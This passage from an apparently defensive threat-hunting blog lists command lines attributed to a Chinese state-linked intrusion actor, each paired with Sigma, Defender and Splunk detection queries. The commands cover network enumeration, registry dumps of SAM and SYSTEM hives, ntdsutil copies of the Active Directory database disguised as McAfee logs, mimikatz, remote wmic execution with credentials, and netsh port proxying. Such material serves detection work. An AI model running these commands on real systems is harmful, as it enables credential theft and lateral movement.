/q:*[System[(EventID=4624) and TimeCreated[@SystemTime&gt;=’{REDACTED}’]] and EventData[Data=’{REDACTED}’]]</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="2978" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1627" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where (ProcessCommandLine contains @’ipconfig /all’ or ProcessCommandLine contains @’netsh interface show interface’ or ProcessCommandLine contains @’netsh interface firewall show all’ or ProcessCommandLine contains @’arp -a’ or ProcessCommandLine contains @’nbtstat -n’ or ProcessCommandLine contains @’net config’ or ProcessCommandLine contains @’net group /dom’ or ProcessCommandLine contains @’net group “Domain Admins” /dom’ or ProcessCommandLine contains @’route print’ or ProcessCommandLine contains @’curl www.ip-api.com&#x27; or ProcessCommandLine contains @’dnscmd’ or ProcessCommandLine contains @’ldifde.exe -f c:\windows\temp\.txt -p subtree’ or ProcessCommandLine contains @’netlocalgroup’ or ProcessCommandLine contains @’netsh interface portproxy show’ or ProcessCommandLine contains @’netstat -ano’ or ProcessCommandLine contains @’reg query hklm\software\’ or ProcessCommandLine contains @’systeminfo’ or ProcessCommandLine contains @’tasklist /v ‘ or ProcessCommandLine contains @’wmic volume list brief’ or ProcessCommandLine contains @’wmic service brief’ or ProcessCommandLine contains @’wmic product list brief’ or ProcessCommandLine contains @’wmic baseboard list brief’ or ProcessCommandLine contains @’wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) ‘)</span></pre><p id="3b1c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="834b" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (CommandLine=”*ipconfig /all*” OR CommandLine=”*netsh interface show interface*” OR CommandLine=”*netsh interface firewall show all*” OR CommandLine=”*arp -a*” OR CommandLine=”*nbtstat -n*” OR CommandLine=”*net config*” OR CommandLine=”*net group /dom*” OR CommandLine=”*net group \”Domain Admins\” /dom*” OR CommandLine=”*route print*” OR CommandLine=”*curl www.ip-api.com*&quot; OR CommandLine=”*dnscmd*” OR CommandLine=”*ldifde.exe -f c:\\windows\\temp\\.txt -p subtree*” OR CommandLine=”*netlocalgroup*” OR CommandLine=”*netsh interface portproxy show*” OR CommandLine=”*netstat -ano*” OR CommandLine=”*reg query hklm\\software\\*” OR CommandLine=”*systeminfo*” OR CommandLine=”*tasklist /v *” OR CommandLine=”*wmic volume list brief*” OR CommandLine=”*wmic service brief*” OR CommandLine=”*wmic product list brief*” OR CommandLine=”*wmic baseboard list brief*” OR CommandLine=”*wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) *”)</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_network_command.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_susp_network_command.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="rt l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="458a" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="a6e8" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (CommandLine=”*ipconfig /all*” OR CommandLine=”*netsh interface show interface*” OR CommandLine=”*arp -a*” OR CommandLine=”*nbtstat -n*” OR CommandLine=”*net config*” OR CommandLine=”*route print*”)</span></pre><p id="7cc0" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="3161" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where (ProcessCommandLine contains @’ipconfig /all’ or ProcessCommandLine contains @’netsh interface show interface’ or ProcessCommandLine contains @’arp -a’ or ProcessCommandLine contains @’nbtstat -n’ or ProcessCommandLine contains @’net config’ or ProcessCommandLine contains @’route print’)</span></pre><h2 id="43c2" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Credential Theft</h2><p id="128d" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment [T1555], [T1003]:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1a60" class="pp ni gv pm b bg pq pr l ps pt">dir C:\Users\{REDACTED}\.ssh\known_hosts</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="0b8c" class="pp ni gv pm b bg pq pr l ps pt">dir</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="073b" class="pp ni gv pm b bg pq pr l ps pt">C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profile s</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="be0d" class="pp ni gv pm b bg pq pr l ps pt">mimikatz.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="62ce" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\OpenSSH</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7985" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\OpenSSH\Agent</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="313e" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\realvnc</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a38e" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\realvnc\vncserver</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="f696" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\realvnc\Allusers</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="eb2c" class="pp ni gv pm b bg pq pr l ps pt">reg query hklm\software\realvnc\Allusers\vncserver</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4b59" class="pp ni gv pm b bg pq pr l ps pt">reg query hkcu\software\{REDACTED}\putty\session</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4ef8" class="pp ni gv pm b bg pq pr l ps pt">reg save hklm\sam ss.dat</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="2f5e" class="pp ni gv pm b bg pq pr l ps pt">reg save hklm\system sy.dat</span></pre><p id="3891" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="c4c6" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\reg.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’reg.exe’ or ProcessVersionInfoOriginalFileName =~ @’reg.exe’) and ProcessCommandLine contains @’save’ and (ProcessCommandLine contains @’reg save hklm\sam ss.dat’ or ProcessCommandLine contains @’reg save hklm\system sy.dat’ or ProcessCommandLine contains @’reg save hklm\system’ or ProcessCommandLine contains @’reg save hklm\sam’))</span></pre><p id="fe8a" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="a139" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\reg.exe” OR OriginalFileName=”reg.exe”) AND CommandLine=”*save*” AND (CommandLine=”*reg save hklm\\sam ss.dat*” OR CommandLine=”*reg save hklm\\system sy.dat*” OR CommandLine=”*reg save hklm\\system*” OR CommandLine=”*reg save hklm\\sam*”))</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Credential Theft Query Registry Software.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qu l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="78b6" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="f2a2" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\reg.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’reg.exe’ or ProcessVersionInfoOriginalFileName =~ @’reg.exe’) and ProcessCommandLine contains @’query’ and (ProcessCommandLine contains @’reg query hklm\software\OpenSSH’ or ProcessCommandLine contains @’reg query hklm\software\OpenSSH\Agent’ or ProcessCommandLine contains @’reg query hklm\software\realvnc’ or ProcessCommandLine contains @’reg query hklm\software\realvnc\vncserver’ or ProcessCommandLine contains @’reg query hklm\software\realvnc\Allusers’ or ProcessCommandLine contains @’reg query hklm\software\realvnc\Allusers\vncserver’ or ProcessCommandLine contains @’reg query hkcu\software\*\putty\session’))</span></pre><p id="c6c3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="94a9" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\reg.exe” OR OriginalFileName=”reg.exe”) AND CommandLine=”*query*” AND (CommandLine=”*reg query hklm\\software\\OpenSSH*” OR CommandLine=”*reg query hklm\\software\\OpenSSH\\Agent*” OR CommandLine=”*reg query hklm\\software\\realvnc*” OR CommandLine=”*reg query hklm\\software\\realvnc\\vncserver*” OR CommandLine=”*reg query hklm\\software\\realvnc\\Allusers*” OR CommandLine=”*reg query hklm\\software\\realvnc\\Allusers\\vncserver*” OR CommandLine=”*reg query hkcu\\software\*\\putty\\session*”))</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regedit_export_critical_keys.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_regedit_export_critical_keys.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="ru l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="97a2" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5ba9" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (Image=”*\\regedit.exe” AND (CommandLine=”* /E *” OR CommandLine=”* -E *”) AND (CommandLine=”*hklm*” OR CommandLine=”*hkey_local_machine*”) AND (CommandLine=”*\\system” OR CommandLine=”*\\sam” OR CommandLine=”*\\security”)) | table ParentImage,CommandLine</span></pre><p id="2d01" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b965" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where (FolderPath endswith @’\regedit.exe’ and (ProcessCommandLine contains @’ /E ‘ or ProcessCommandLine contains @’ -E ‘) and (ProcessCommandLine contains @’hklm’ or ProcessCommandLine contains @’hkey_local_machine’) and (ProcessCommandLine endswith @’\system’ or ProcessCommandLine endswith @’\sam’ or ProcessCommandLine endswith @’\security’))</span></pre><h2 id="55fb" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Additional Commands</h2><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="c0fc" class="pp ni gv pm b bg pq pr l ps pt">7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z</span></pre><p id="1d9f" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT Creating a 7z Achrive in temp</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Creating%20a%207z%20Archive%20in%20temp.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Creating a 7z Archive in temp.yml at main · Schmouni242/Sigma-Rules</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="rv l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="488c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="af35" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\7z.exe” OR OriginalFileName=”7z.exe”) AND CommandLine=”*a -p*” AND (CommandLine=”*c:\\windows\\temp\\*”))</span></pre><p id="2e19" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="f957" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\7z.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’7z.exe’ or ProcessVersionInfoOriginalFileName =~ @’7z.exe’) and ProcessCommandLine contains @’a -p’ and ProcessCommandLine contains @’c:\windows\temp\’)</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7b90" class="pp ni gv pm b bg pq pr l ps pt">C:\Windows\system32\pcwrun.exe C:\Users\Administrator\Desktop\Win.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d35c" class="pp ni gv pm b bg pq pr l ps pt">C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 &gt; C:\Windows\temp\putty.log</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="cb76" class="pp ni gv pm b bg pq pr l ps pt">C:\Windows\Temp\tmp.log</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="e024" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe” /c dir \\127.0.0.1\C$ /od</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="2f95" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe” /c ping –a –n 1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4243" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe” /c wmic /user: /password: process call create “net stop \”\” &gt; C:\Windows\Temp\tmp.log”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="53bf" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\__ 2&gt;&amp;1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="98e2" class="pp ni gv pm b bg pq pr l ps pt">net use \\127.0.0.1\IPC$ /y /d</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="8f73" class="pp ni gv pm b bg pq pr l ps pt">powershell start-process -filepath c:\windows\temp\.bat -windowstyle Hidden rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED}</span></pre><p id="5d06" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT PowerShell Hidden RAR Execution</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20PowerShell%20Hidden%20RAR%20Execution.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT PowerShell Hidden RAR Execution.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="rw l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="3635" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="8ee3" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\powershell.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’powershell.exe’ or ProcessVersionInfoOriginalFileName =~ @’powershell.exe’) and ProcessCommandLine contains @’start-process’ and (ProcessCommandLine contains @’filepath c:\windows\temp\’ and ProcessCommandLine contains @’windowstyle Hidden rar.exe’))</span></pre><p id="b759" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="9fa3" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\powershell.exe” OR OriginalFileName=”powershell.exe”) AND CommandLine=”*start-process*” AND ((CommandLine=”*filepath c:\\windows\\temp\\*”) AND (CommandLine=”*windowstyle Hidden rar.exe*”)))</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a43b" class="pp ni gv pm b bg pq pr l ps pt">D:\{REDACTED}\</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a544" class="pp ni gv pm b bg pq pr l ps pt">wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="477b" class="pp ni gv pm b bg pq pr l ps pt">xcopy C:\windows\temp\hp d:\{REDACTED}</span></pre><h2 id="7832" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Command Execution</h2><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="615e" class="pp ni gv pm b bg pq pr l ps pt">7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z c:\windows\temp\*</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="f57f" class="pp ni gv pm b bg pq pr l ps pt">“C:\pstools\psexec.exe” \\{REDACTED} -s cmd /c “cmd.exe /c “netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999””</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d8ac" class="pp ni gv pm b bg pq pr l ps pt">C:\Windows\system32\pcwrun.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d659" class="pp ni gv pm b bg pq pr l ps pt">C:\Users\Administrator\Desktop\Win.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="3f5d" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /C dir /S \\{REDACTED}\c$\Users\{REDACTED} &gt;&gt; c:\windows\temp\{REDACTED}.tmp</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="9439" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe” /c wmic process call create “cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\McAfee_Logs\”</span></pre><p id="756d" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT Credential Dumping as McAffee Logs</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Credential%20Dumping%20as%20McAffee%20Logs.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Credential Dumping as McAffee Logs.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="rx l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="5832" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="7df3" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and ProcessCommandLine contains @’/c wmic process call create’ and (ProcessCommandLine contains @’cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs’ or ProcessCommandLine contains @’&amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\McAfee_Logs\’))</span></pre><p id="32a7" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5a74" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND CommandLine=”*/c wmic process call create*” AND (CommandLine=”*cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs*” OR CommandLine=”*&amp; ntdsutil \\\”ac i ntds\\\” ifm \\\”create full C:\\Windows\\Temp\\McAfee_Logs\\*”))</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="f784" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\__ 2&gt;&amp;1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="ee2d" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c net group “domain admins” /dom 1&gt;\\127.0.0.1\ADMIN$\__ 2&gt;&amp;1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="1721" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\” 1&gt; \\127.0.0.1\ADMIN$\ 2&gt;&amp;1</span></pre><p id="8309" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT Credential Dumping to ADMIN localhost</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Credential%20Dumping%20to%20ADMIN%20localhost.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Credential Dumping to ADMIN localhost.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="ry l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="ada3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5462" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and ProcessCommandLine contains @’/c wmic process call create’ and (ProcessCommandLine contains @’”cmd.exe /c mkdir C:\Windows\Temp\tmp’ or ProcessCommandLine contains @’&amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\” 1&gt; \\127.0.0.1\ADMIN$\ 2&gt;&amp;1&#x27;))</span></pre><p id="dcb2" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="318a" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND CommandLine=”*/c wmic process call create*” AND (CommandLine=”*\”cmd.exe /c mkdir C:\\Windows\\Temp\\tmp*” OR CommandLine=”*&amp; ntdsutil \\\”ac i ntds\\\” ifm \\\”create full C:\\Windows\\Temp\\tmp\\\” 1&gt; \\127.0.0.1\\ADMIN$\\ 2&gt;&amp;1*”))</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a2eb" class="pp ni gv pm b bg pq pr l ps pt">D:\{REDACTED}\xcopy C:\windows\temp\hp d:\{REDACTED}</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b6fe" class="pp ni gv pm b bg pq pr l ps pt">Get-EventLog security -instanceid 4624</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="ede2" class="pp ni gv pm b bg pq pr l ps pt">ldifde.exe -f c:\windows\temp\cisco_up.txt -p subtree</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="8e21" class="pp ni gv pm b bg pq pr l ps pt">makecab ..\backup\210829–020000.zip ..\webapps\adssp\html\Lock.lic</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="74fb" class="pp ni gv pm b bg pq pr l ps pt">move “\\\c$\users\public\Appfile\registry\SYSTEM” ..\backup\210829–020000.zip</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a235" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a6cc" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="eec8" class="pp ni gv pm b bg pq pr l ps pt">Rar.exe a –{REDACTED} c:\Windows\temp\DMBC2C61.tmp</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4faf" class="pp ni gv pm b bg pq pr l ps pt">start-process -filepath c:\windows\temp\.bat — windowstyle hidden 1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="950c" class="pp ni gv pm b bg pq pr l ps pt">Note: The batch file in question (.bat) could use any name, and no discernable pattern has been determined at this time.</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4346" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “cmd.exe /c 